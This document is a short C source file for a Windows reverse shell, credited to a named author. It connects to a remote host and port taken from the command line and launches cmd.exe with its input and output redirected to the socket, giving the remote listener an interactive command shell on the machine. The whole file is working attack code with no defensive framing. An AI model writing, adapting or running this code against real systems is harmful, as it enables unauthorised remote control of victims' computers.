//CREDIT FOR BASE CODE AUTHOR: Ma~Far$ (a.k.a. Yahav N. Hoffmann)

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;


int main(int argc, char *argv[])
{
	if(argc > 3)
	{
		printf("Usage: ./client <RHOST> <RPORT>\n");
		exit(1);
	}

	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    if (argv[1] == NULL){
		exit(1);
	}

    struct hostent *host;
	
	if(argc == 1)
		host = gethostbyname("127.0.0.1");
	else if(argc > 1)
		host = gethostbyname(argv[1]);
	
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(argv[2]));
	hax.sin_addr.s_addr =inet_addr(aip_addr);

	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		
		//now we have to make sure input is handled properly
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		exit(0);
	}

	else {
		exit(0);
	}
}

